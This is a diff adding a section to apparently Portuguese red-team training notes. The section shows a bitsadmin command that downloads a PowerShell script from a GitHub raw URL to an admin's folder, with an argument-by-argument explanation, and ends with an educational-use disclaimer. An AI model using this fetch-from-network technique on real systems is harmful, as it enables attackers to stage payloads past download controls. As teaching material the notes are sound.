@@ -194,6 +194,21 @@ C:\Users\admin> dir
 C:\Users\admin> type info.ps1
 ```
 
+BITSADMIN
+
+O utilitário BITSAdmin é uma ferramenta de linha de comando antiga do Windows que permite gerenciar transferências de arquivos usando o serviço Background Intelligent Transfer Service (BITS).
+```
+bitsadmin /transfer MeuJob /download /priority normal https://raw.githubusercontent.com/smithbraz/windows/refs/heads/main/scripts-powershell/info.ps1 C:\Users\admin\info.ps1
+```
+Detalhes:
+• `bitsadmin`	→ chama o utilitário.
+• `/transfer MeuJob`	→ cria uma tarefa de transferência com o nome "MeuJob".
+• `/download`	→ indica que é um download.
+• `/priority normal`	→ define a prioridade da tarefa.
+• `https://raw.githubusercontent.com/smithbraz/windows/refs/heads/main/scripts-powershell/info.ps1`	→ URL do arquivo a ser baixado.
+• `C:\Users\admin\info.ps1`	→ caminho local onde o arquivo será salvo.
+
+
 # Aviso de Isenção de Responsabilidade – Material de Red Team
 Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. As técnicas, exemplos e cenários aqui descritos têm como objetivo demonstrar vulnerabilidades potenciais e auxiliar profissionais de segurança na prevenção, detecção e resposta a ameaças.
 • Não é permitido utilizar este conteúdo para atividades ilegais, maliciosas ou que violem políticas corporativas, regulamentos ou legislações vigentes.
